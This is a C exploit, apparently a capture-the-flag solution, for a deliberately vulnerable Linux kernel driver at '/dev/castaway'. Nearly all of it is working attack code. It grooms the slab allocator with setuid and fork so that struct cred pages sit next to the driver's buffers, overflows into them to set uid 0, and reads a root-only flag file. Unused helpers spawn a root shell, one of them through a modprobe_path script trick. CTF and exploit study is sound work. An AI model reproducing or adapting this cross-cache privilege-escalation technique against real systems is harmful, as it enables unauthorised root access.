#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <assert.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/timerfd.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <pthread.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <errno.h>
#include <stdbool.h>
#include <stddef.h>
#include <poll.h>

#define DEV_PATH "/dev/castaway"   // the path the device is placed

#define ulong unsigned long
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET

#define WAIT(void) {getc(stdin); \
                    fflush(stdin);}
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)

#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
                            errExit("KMALLOC"); \
                        }

static void print_hex8(void* buf, size_t len)
{
    uint64_t* tmp = (uint64_t*)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%d: %p ", i, tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

static uint64_t bswap(uint64_t val)
{
    __asm__(
            ".intel_syntax noprefix;"
            "bswap rdi;"
            "mov rax, rdi;"
            ".att_syntax;"
    );
}

static void shell_modprobe()
{
    system("echo '#!/bin/sh' > /tmp/x; \
            echo 'setsid cttyhack setuidgid 0 /bin/sh' >> /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/y");
    system("chmod +x /tmp/y");
    system("/tmp/y");
}

struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
    ulong sp; ulong ss;
};

static void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}

uint64_t user_cs,user_ss,user_sp,user_rflags;
static void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

static int create_timer(int leak)
{
  struct itimerspec its;

  its.it_interval.tv_sec = 0;
  its.it_interval.tv_nsec = 0;
  its.it_value.tv_sec = 2;
  its.it_value.tv_nsec = 0;

  int tfd = timerfd_create(CLOCK_REALTIME, 0);
  timerfd_settime(tfd, 0, &its, 0);

  if (leak)
  {
    close(tfd);
    sleep(1);
    return 0;
  }
}

static void get_shell()
{
    if (!getuid())
	{
		puts("Got r00t :)");
		system("/bin/sh");
	}
	exit(0);
}

int userfaultfd(int flags)
{
    return syscall(SYS_userfaultfd, flags);
}

bool is_kernel_ptr(uint64_t val)
{
    return (val & 0xffffffff00000000) == 0xffffffff00000000
        && val != 0xffffffffffffffff;
}

#define CREATE 0xcafebabe
#define EDIT 0xf00dbabe

typedef struct {
    size_t idx;
    size_t len;
    uint8_t *buf;
} req_t;

typedef struct {
    uint32_t ref_cnt;
    uint16_t uid;
} cred_t;

static int create(int fd)
{
    static int cnt = 0;
    if (ioctl(fd, CREATE) < 0) {
        errExit("create");
    }

    return cnt++;
}

static void edit(int fd, size_t idx, uint8_t *buf, size_t len)
{
    req_t req = {
        .idx = idx,
        .len = len,
        .buf = buf
    };

    if (ioctl(fd, EDIT, &req) < 0) {
        errExit("edit");
    }
}

static void search_kernel_ptr(uint8_t* ptr, size_t len)
{
    uint64_t *_ptr = (uint64_t*)ptr;
    for (size_t i = 0; i < (len / 0x8); i++) {
        if (is_kernel_ptr(_ptr[i])) {
            printf("Found leak: %p \n", _ptr[i]);
        }
    }
}

static void try_read_flag(int fd_read)
{
    struct pollfd poller = {
        .fd = fd_read,
        .events = POLLIN
    };

    poll(&poller, 0x1, -0x1);

    seteuid(0);

    int fd = open("/root/flag.txt", O_RDONLY);
    if (fd < 0) {
        while (1) {
            asm("");
        }
        return;
    }

    char buf[0x100] = {0};
    read(fd, buf, sizeof(buf));

    printf("Flag: %s \n", buf);

    return;
}

int setup_sandbox(void) {
  if (unshare(CLONE_NEWUSER) < 0) {
      errExit("unshare(CLONE_NEWUSER)");
  }
  if (unshare(CLONE_NEWNET) < 0) {
      errExit("unshare CLONE_NEWNET");
  }

  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(0, &set);
  if (sched_setaffinity(getpid(), sizeof(set), &set) < 0) {
      errExit("sched_setaffinity");
  }

  return 0;
}

// 400 allocations allowed
// 0x200 = size of entries
int main(void)
{
    int ret;
    int fd = open(DEV_PATH, O_RDONLY);
    int fds[0x2];

    if (fd < 0) {
        errExit("open");
    }

    ret = pipe(fds);

    if (ret < 0) {
        errExit("pipe");
    }

    puts("[+] Stage 1");

    for (int i = 0; i < 50; i++) {
        for (int j = 0; j < 8; j++) {
            create(fd);
        }

        /*
            clone -> copy_process has a lot of noise that is going to make it very
            hard to get a contiguous page of struct cred after the castaway slab,
            because if the page is free then it'll probably get claimed by some
            other order 0 slab

            setuid does an unconditional prepare_cred which can help to allocate
            the page contiguously before all the noise

            it'll get freed but the page will remain for a bit as you know

            => use setuid to allocate the page, then have fork actually
            occupying it


            q: shouldnt there be existing free objects in an earlier cred jar slab

            sometimes yes sometimes no - that's why you loop x times
            i do save all the processes for the end, write(sync.write, &dummy, 1);
            will make them all evaluate their own privileges concurrently
            (and read flag if they can), they're idling on a blocking pipe


            => reserve the page after the cache for cred structs using the
            setuid call

            other way to lower noise:
            cloning with CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND
            does lower a lot of noise, iirc only 3 small chunks in separate slabs
            allocated (as I didn't enable slab merging in kconfig) plus 4
            order 0 pages from the vmalloc for kernel stack

        */
        setuid(0);

        // 4096 / 192 = 21.3
        for (int j = 0; j < 21; j++) {
            if (!fork()) {
                try_read_flag(fds[0]);
                exit(0);
            }
        }
    }

    puts("[+] Stage 2");

    char buf[0x200] = {0x0};
    cred_t *cred = (cred_t*)&buf[0x200-0x6];
    cred->ref_cnt = 0x100;
    cred->uid = 0x0;
    for (int i = 0; i < 400; i++) {
        edit(fd, i, buf, sizeof(buf));
    }

    char dummy = 0x0;
    write(fds[0x1], &dummy, sizeof(dummy));

    sleep(10);

    return 0;
}

// corctf{3xpL01t1nG_cR3d_j@R_c0m3s_b@cK_fr0m_th3_d3@d_w1th_cr0Ss_c@ch3_0v3rfl0w}
